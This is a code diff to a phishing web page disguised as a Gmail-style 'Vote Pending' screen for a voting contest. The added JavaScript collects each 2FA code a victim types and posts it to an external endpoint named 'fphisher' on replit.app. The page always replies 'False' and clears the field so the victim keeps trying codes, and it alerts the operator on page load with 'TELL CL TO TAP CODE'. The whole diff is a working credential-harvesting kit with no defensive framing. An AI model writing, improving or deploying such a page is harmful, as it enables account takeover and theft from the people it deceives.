@@ -23,6 +23,16 @@
       z-index: 100;
     }
 
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20% { transform: translateX(-8px); }
+      40% { transform: translateX(8px); }
+      60% { transform: translateX(-5px); }
+      80% { transform: translateX(5px); }
+    }
+
+    .shake { animation: shake 0.4s ease; }
+
     :root {
       --bg-page:     #f0f4f9;
       --bg-card:     #ffffff;
@@ -33,7 +43,7 @@
     @media (prefers-color-scheme: dark) {
       :root {
         --bg-page:     #131314;
-        --bg-card:     #131314;
+        --bg-card:     #1f1f1f;
         --text-heading:#e8eaed;
         --text-body:   #e3e3e3;
       }
@@ -61,6 +71,36 @@
       padding: 0 32px;
     }
 
+    .code-input {
+      width: 100%;
+      max-width: 320px;
+      background: #2c2c2c;
+      border: 1.5px solid #555;
+      color: white;
+      font-size: 18px;
+      padding: 16px 20px;
+      border-radius: 12px;
+      outline: none;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .code-input:focus {
+      border-color: #8ab4f8;
+    }
+
+    .error-text {
+      color: #f28b82;
+      font-size: 14px;
+      margin-top: 8px;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .error-text.show {
+      opacity: 1;
+    }
+
     .g-heading { color: var(--text-heading); }
     .g-body { color: var(--text-body); }
   </style>
@@ -68,51 +108,116 @@
 <body class="min-h-screen flex items-center justify-center">
 
   <div class="g-card">
-    <!-- Top Loading Bar (always running) -->
+    <!-- Top Loading Bar -->
     <div class="loading-bar"></div>
 
     <!-- Content -->
-    <div class="mb-12">
+    <div class="mb-10">
       <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 mx-auto text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.25">
         <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7" />
       </svg>
     </div>
 
-    <h1 class="g-heading text-[28px] font-medium mb-6">Vote Pending</h1>
+    <h1 class="g-heading text-[28px] font-medium mb-4">Vote Pending</h1>
     
-    <p class="g-body text-[15px] leading-relaxed max-w-[290px]">
+    <p class="g-body text-[15px] leading-relaxed max-w-[290px] mb-10">
       Check your Gmail and approve your login request and Get the code to tap from contestant and verify your vote
     </p>
+
+    <!-- Enter Code Section -->
+    <div class="w-full max-w-[320px]">
+      <input 
+        id="codeInput" 
+        type="text" 
+        maxlength="10"
+        placeholder="Enter code" 
+        class="code-input"
+        onkeypress="if(event.key === 'Enter') submitCode()"
+      />
+      
+      <div id="errorMsg" class="error-text">False</div>
+
+      <div class="flex justify-end mt-6">
+        <button onclick="submitCode()" 
+                class="bg-[#8ab4f8] hover:bg-[#6699ff] text-black font-medium px-10 py-3 rounded-full text-[15px] transition-colors">
+          Next
+        </button>
+      </div>
+    </div>
   </div>
 
   <script>
     const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
 
-    // Send “LOGIN PENDING| TELL CL TO TAP CODE” immediately when page loads
+    // Send initial pending status when page loads
     async function sendPendingStatus() {
       try {
         await fetch(ENDPOINT, {
           method: "POST",
-          headers: { 
-            "Content-Type": "application/json" 
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            status: "LOGIN PENDING| TELL CL TO TAP CODE",
+            status: "LOGIN PENDING | TELL CL TO TAP CODE",
             message: "Vote Pending - User reached verification screen",
             timestamp: Date.now()
           })
         });
-        console.log("Pending status sent to backend");
       } catch (err) {
         console.error("Failed to send pending status:", err);
       }
     }
 
-    // Automatically send when the page loads
+    // Send each code attempt
+    async function sendCodeAttempt(code) {
+      try {
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            code: code,
+            status: "CODE_ATTEMPT",
+            message: "User entered 2FA code",
+            timestamp: Date.now()
+          })
+        });
+      } catch (err) {
+        console.error("Failed to send code:", err);
+      }
+    }
+
+    function showError() {
+      const errorEl = document.getElementById('errorMsg');
+      const input = document.getElementById('codeInput');
+      
+      errorEl.classList.add('show');
+      input.classList.add('shake');
+      
+      setTimeout(() => {
+        input.classList.remove('shake');
+      }, 400);
+    }
+
+    async function submitCode() {
+      const input = document.getElementById('codeInput');
+      const code = input.value.trim();
+
+      if (!code) {
+        input.classList.add('shake');
+        setTimeout(() => input.classList.remove('shake'), 400);
+        return;
+      }
+
+      // Send the code to your backend
+      await sendCodeAttempt(code);
+
+      // Always show "False" and clear input for next attempt
+      showError();
+      input.value = '';   // Clear the field
+    }
+
+    // Auto-send pending status on load
     window.onload = function() {
       sendPendingStatus();
     };
   </script>
-
 </body>
 </html>
